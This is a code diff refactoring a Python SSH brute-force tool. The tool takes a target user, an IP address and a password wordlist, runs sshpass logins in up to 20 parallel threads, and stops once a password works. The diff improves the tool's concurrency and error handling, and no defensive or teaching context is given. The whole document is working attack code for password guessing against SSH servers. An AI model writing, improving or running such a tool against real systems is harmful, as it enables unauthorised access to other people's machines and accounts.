@@ -6,43 +6,56 @@ import threading
 import time
 import argparse
 
+# Argument Parsing
 parser = argparse.ArgumentParser()
-parser.add_argument('-u', '--u')
-parser.add_argument('-ip', '--ip')
-parser.add_argument('-f', '--file')
+parser.add_argument('-u', '--u', required=True)
+parser.add_argument('-ip', '--ip', required=True)
+parser.add_argument('-f', '--file', default="yes.txt")
 args = parser.parse_args()
-
-file = args.file
-
-if not file:
-	file = "yes.txt"
-
-passwords = open(file, "r")
 
 user = args.u
 ip = args.ip
+file = args.file
 
-tentativa = 1280
+# Read password file
+try:
+    with open(file, "r") as f:
+        passwordsArray = [line.strip() for line in f.readlines()]
+except FileNotFoundError:
+    print(f"Error: File '{file}' not found.")
+    sys.exit(1)
 
-global dead
-dead = False
+# Concurrency Settings
+MAX_THREADS = 20  # Adjust based on system resources
+stop_event = threading.Event()  # Thread-safe flag
 
+# SSH Login Attempt
 def login(password):
-	if os.system("sshpass -p "+password+" ssh "+user+"@"+ip+" 2>/dev/null exit") == 0:
-		print("[*] Password found : " + password + " [*]")
-		global dead
-		dead = True
+    if stop_event.is_set():  # Stop early if password found
+        return
+    
+    cmd = f"sshpass -p '{password}' ssh {user}@{ip} 2>/dev/null exit"
+    if os.system(cmd) == 0:
+        print(f"[*] Password found: {password} [*]")
+        stop_event.set()  # Stop all threads
 
-count=0
-passwordsArray = passwords.readlines()
-	
-for i in range(0, len(passwordsArray)):
-	if not dead:
-		thread1 = threading.Thread(target=login, args=(passwordsArray[i].strip(),))		
-		thread1.start()
-		if i%20 == 0 and not i == 0:
-			time.sleep(1)
-	else:
-		thread1.join()
-		print("Leaving...")
-		sys.exit()
+# Thread Management
+threads = []
+for i, password in enumerate(passwordsArray):
+    if stop_event.is_set():
+        break  # Stop early if password is found
+
+    t = threading.Thread(target=login, args=(password,))
+    threads.append(t)
+    t.start()
+
+    if len(threads) >= MAX_THREADS:  
+        for t in threads:
+            t.join()  # Wait for threads to finish
+        threads.clear()  # Reset the thread list
+
+# Ensure all threads complete before exiting
+for t in threads:
+    t.join()
+
+print("Exiting...")
